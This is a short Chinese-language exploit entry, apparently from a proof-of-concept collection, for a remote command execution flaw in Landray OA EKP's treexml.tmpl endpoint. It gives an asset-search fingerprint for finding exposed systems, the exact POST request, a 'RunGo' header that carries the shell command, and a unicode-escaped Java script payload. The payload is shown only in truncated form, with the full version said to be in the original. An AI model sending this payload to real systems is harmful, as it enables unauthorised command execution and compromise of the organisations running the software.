# 蓝凌OAEKPtreexml存在远程命令执行漏洞

- **系统**：蓝凌　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌OA"`
- **请求**：`POST /data/sys-common/treexml.tmpl HTTP/1.1`
- **关键头**：`Content-Length: 17389`　`RunGo: dir`　`content-type: application/x-www-form-urlencoded`

**请求体 / payload**
```
s_bean=ruleFormulaValidate&script=\u0062\u006f\u006f\u006c\u0065\u0061\u006e\u0020\u0066\u006c\u0061\u0067\u0020\u003d\u0020\u0066\u0061\u006c\u0073\u0065\u003b\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0020\u0067\u0072\u006f\u0075\u0070\u0020\u003d\u0020\u0054\u0068\u0072\u0065\u0061\u0064\u002e\u0063\u0075\u0072\u0072\u0065\u006e\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0028\u0029\u002e\u0067\u0065\u0074\u0054\u0068\u0072\u0065\u0061\u0064\u0047\u0072\u006f\u0075\u0070\u0028\u0029\u003b\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0072\u0065\u0066\u…（脚本共 17380 字，完整版见原文）
```

**其他**
- 蓝凌OA EKP treexml存在远程命令执行漏洞: * 一、漏洞简介
* 二、漏洞简介
* 三、资产测绘
* 四、漏洞复现
***